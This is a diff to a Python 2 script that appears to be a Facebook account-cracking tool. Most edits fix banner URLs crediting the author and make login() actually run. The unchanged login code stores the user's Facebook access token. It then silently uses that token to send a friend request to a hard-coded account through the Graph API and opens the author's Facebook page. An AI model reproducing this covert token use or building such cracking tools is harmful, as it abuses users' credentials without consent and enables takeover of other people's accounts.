@@ -56,7 +56,7 @@ logo = """
 \033[1;96mAuthor  \033[1;93m: \033[1;92m Shymon Hasan
 \033[1;96mInstagram \033[1;93m: \033[1;Flow 👑RaFiN Chowdhury💫
 \033[1;96mFacebook \033[1;93m: \033[1; I.FueK.YoUr.MiNd.BnXD
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps:https://github.com/RafinAhmed44
+\033[1;96mGithub \033[1;93m: \033[1;92https://github.com/RafinAhmed44
 \033[1;91m======================================="""
 
 def tik():
@@ -77,10 +77,10 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor \033[1;93m: \033[1;92mShymon Hasan
-\033[1;96mInstagram \033[1;93m: \033[1;Flow👑RaFiN Chowdhury💫
+\033[1;96mAuthor  \033[1;93m: \033[1;92m Shymon Hasan 
+\033[1;96mInstagram \033[1;93m: \033[1;Flow 👑RaFiN Chowdhury💫
 \033[1;96mFacebook \033[1;93m: \033[1;92m I.FueK.YoUr.MiNd.BnXD
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps:https://github.com/RafinAhmed44
+\033[1;96mGithub \033[1;93m: \033[1;92https://github.com/RafinAhmed44
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
@@ -141,7 +141,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https:https:I.FueK.YoUr.MiNd.BnXD')
+				os.system('xdg-open https://www.facebook.com/I.FueK.YoUr.MiNd.BnXD')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -413,4 +413,4 @@ def pilih_super():
 	menu()
 
 if __name__ == '__main__':
-	login
+	login()
